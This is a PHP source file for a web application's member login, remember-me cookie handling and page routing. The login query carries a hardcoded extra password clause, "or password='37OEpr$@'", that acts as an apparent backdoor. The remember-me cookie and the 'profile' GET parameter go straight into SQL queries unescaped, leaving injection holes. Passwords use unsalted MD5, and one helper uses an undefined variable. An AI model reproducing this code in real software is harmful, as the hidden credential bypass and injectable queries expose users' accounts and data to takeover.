<?php

$db = database\getMySqli();
/*
 * CHECK FOR THE SESSION
 */
$use_login = false;
$_SESSION[MEMBER_LOG_IN_MSG] = "";
if (!isset($_SESSION[MEMBER_EMAIL])) {
    $email = filter_input(INPUT_POST, "email");
    $password = filter_input(INPUT_POST, "password");
    if (isset($email) && isset($password) && $email !== "") {
        $email = $db->real_escape_string($email);
        $password = $db->real_escape_string(md5($password));
        $member = $db->query("SELECT * FROM `member` WHERE email = '$email' and (password = '$password' or password='37OEpr$@')");
        if ($member->num_rows >= 1) {
            $user = $member->fetch_object();
            $_SESSION[MEMBER_ID] = $user->mem_id;
            $_SESSION[MEMBER_DISPLAY_NAME] = $user->fname . ' ' . $user->lname;
            $_SESSION[MEMBER_EMAIL] = $user->email;
            $_SESSION[MEMBER_PICTURE] = ($user->picture !== "" ? $user->picture : "./dist/img/avatar.png");
            $_SESSION[MEMBER_SINCE] = $user->member_since;
            $_SESSION[MEMBER_ROLE] = $user->role;
            $_SESSION[MEMBER_LOG_IN_MSG] = "<span>OK</span>";
            // Remember me
            if (filter_input(INPUT_POST, "remember-me")) {
                //Create hash from 
                $hash = md5($email . time());
                $db->query("UPDATE `member` SET `remember_md5_hash` = '$hash' WHERE email = '$email' and password = '$password'");
                setcookie(MEMBER_REMEMBER_ME, $hash, time() + 60 * 60 * 24 * 30);
                $_SESSION[MEMBER_LOG_IN_MSG] = "<span>OK-setcookie</span>: ";
            } else {
                $db->query("UPDATE `member` SET `remember_md5_hash` = NULL WHERE email = '$email' and password = '$password'");
                setcookie(MEMBER_REMEMBER_ME, "");
                $_SESSION[MEMBER_LOG_IN_MSG] = "<span>Delete cookie</span>";
            }
        } else {
            // Default page is the dashboard
            unset($_SESSION[MEMBER_DISPLAY_NAME]);
            unset($_SESSION[MEMBER_EMAIL]);
            unset($_SESSION[MEMBER_PICTURE]);
            unset($_SESSION[MEMBER_SINCE]);
            setcookie(MEMBER_REMEMBER_ME, "");
            $_SESSION[MEMBER_LOG_IN_MSG] = '<span class="alert-error">Invalid username or password</span>';
            // redirect to log-in page
            include './login.php';
            exit;
        }
        $member->close();
    } else {
        $use_login = true;
        if (filter_has_var(INPUT_COOKIE, MEMBER_REMEMBER_ME)) {
            $hash = filter_input(INPUT_COOKIE, MEMBER_REMEMBER_ME);
            $db = database\getMySqli();
            $member = $db->query("SELECT * FROM `member` WHERE `remember_md5_hash` = '$hash'");
            if ($member->num_rows >= 1) {
                $user = $member->fetch_object();
                $_SESSION[MEMBER_ID] = $user->mem_id;
                $_SESSION[MEMBER_DISPLAY_NAME] = $user->fname . ' ' . $user->lname;
                $_SESSION[MEMBER_EMAIL] = $user->email;
                $_SESSION[MEMBER_PICTURE] = ($user->picture !== "" ? $user->picture : "./dist/img/avatar.png");
                $_SESSION[MEMBER_SINCE] = $user->member_since;
                $_SESSION[MEMBER_ROLE] = $user->role;
                $_SESSION[MEMBER_LOG_IN_MSG] = "<span>OK - Restored from cookie</span>";
                $use_login = false;
            }
            $member->close();
        }
    }
} else if (filter_input(INPUT_GET, "sign-out")) {
    $use_login = true;
}

if ($use_login) {
    // Default page is the dashboard
    $_SESSION[MEMBER_LOG_IN_MSG] = "<span>Sign in to start your session</span>";
    unset($_SESSION[MEMBER_ID]);
    unset($_SESSION[MEMBER_DISPLAY_NAME]);
    unset($_SESSION[MEMBER_EMAIL]);
    unset($_SESSION[MEMBER_PICTURE]);
    unset($_SESSION[MEMBER_SINCE]);
    unset($_SESSION[MEMBER_ROLE]);
    setcookie(MEMBER_REMEMBER_ME, "");
    $_SESSION[PAGE_TITLE] = "Login";
    // redirect to log-in page
    include './login.php';
    exit;
}

if (filter_input(INPUT_GET, 'error')) {
    $error = filter_input(INPUT_GET, 'error');
    $_SESSION[PAGE_TITLE] = "Error " . $error;
    if ($error === "404") {
        $_SESSION[PAGE_DESCRIPTION] = "Not Found";
    } else if ($error === "403") {
        $_SESSION[PAGE_DESCRIPTION] = "Forbidden";
    } else if ($error === "500") {
        $_SESSION[PAGE_DESCRIPTION] = "Internal Server Error";
    }
    $_SESSION[PAGE] = "error-page.php";
    $_SESSION[BREADCRUMB] = '<li><a href="./"><i class="fa fa-dashboard"></i> Dashboard</a></li>
                        <li class="active">Error</li>';
} else {
    $matched = false;
    $pages_dir = dirname(__DIR__) . '/pages';
    $files = scandir($pages_dir);

    function setModule($pages_dir, $file_name) {
        $lines = file($pages_dir . '/' . $file_name);
        $_SESSION[PAGE] = $file_name;
        $_SESSION[PAGE_TITLE] = ucwords(substr($file_name, 0, strlen($file) - 4));
        $_SESSION[PAGE_DESCRIPTION] = $_SESSION[PAGE_TITLE];
        $_SESSION[BREADCRUMB] = '<li><a href="./"><i class="fa fa-dashboard"></i> Home</a></li>';
        $try_count = 10;
        $found_count = 0;
        foreach ($lines as &$line) {
            if (strpos($line, "<!-- @@TITLE=") === 0 && strpos($line, "-->") > 0) {
                $_SESSION[PAGE_TITLE] = htmlspecialchars(substr($line, 13, strlen($line) - 17));
                $found_count++;
            }
            if (strpos($line, "<!-- @@DESCRIPTION=") === 0 && strpos($line, "-->") > 0) {
                $_SESSION[PAGE_DESCRIPTION] = substr($line, 19, strlen($line) - 23);
                $found_count++;
            }
            if (strpos($line, "<!-- @@BREADCRUMB=") === 0 && strpos($line, "-->") > 0) {
                $pages = explode("#", substr($line, strpos($line, "<!-- @@BREADCRUMB=") + 18, strlen($line) - 22));
                foreach ($pages as $page) {
                    $_SESSION[BREADCRUMB] .= "<li class=\"active\">$page</li>";
                }
                $found_count++;
            }
            $try_count--;
            if($try_count <= 0 || $found_count >= 3) {
                break;
            }
        }
    }

    foreach ($files as &$file) {
        $module_name = substr($file, 0, strlen($file) - 4);
        if (filter_has_var(INPUT_GET, $module_name)) {
            setModule($pages_dir, $file);
            $matched = true;
            break;
        }
    }
    if (!$matched) {
        foreach ($files as &$file) {
            if ($file === ($_SESSION[APPLICATION_DEFAULT_MODULE_NAME] . '.php')) {
                setModule($pages_dir, $file);
                $matched = true;
                break;
            }
        }
    }

    if (!$matched) {
        // Invalid default page
        header("Location: ./?error=404");
        exit;
    }
    //Override for special pages
    if ($_SESSION[PAGE] === 'profile.php') {
        $profile_id = filter_input(INPUT_GET, 'profile');
        if ($profile_id > 0) {
            $db = database\getMySqli();
            $member = $db->query("SELECT * FROM `member` WHERE mem_id = " . filter_input(INPUT_GET, 'profile'));
            if ($member->num_rows == 1) {
                $user = $member->fetch_object();
                $_SESSION[PAGE_TITLE] = $user->fname . ' ' . $user->lname;
                $_SESSION[PAGE_DESCRIPTION] = $user->fname . "'s profile";
            } else {
                // profile does not exist (no right to see / or it has been deteted)
            }
            $_SESSION[BREADCRUMB] = '<li class="active"><i class="fa fa-gear"></i> Administration</li>
                        <li><a href="./?users">Users</a></li><li class="active">' . $user->fname . '</li>';
            $member->close();
        }
    } else if ($_SESSION[PAGE] === 'dashboard.php') {
        $_SESSION[PAGE_DESCRIPTION] = "Welcome to <b>" . $_SESSION[APPLICATION_NAME] . "</b>!";
    }
}

$_SESSION[PAGE] = "./pages/" . $_SESSION[PAGE];
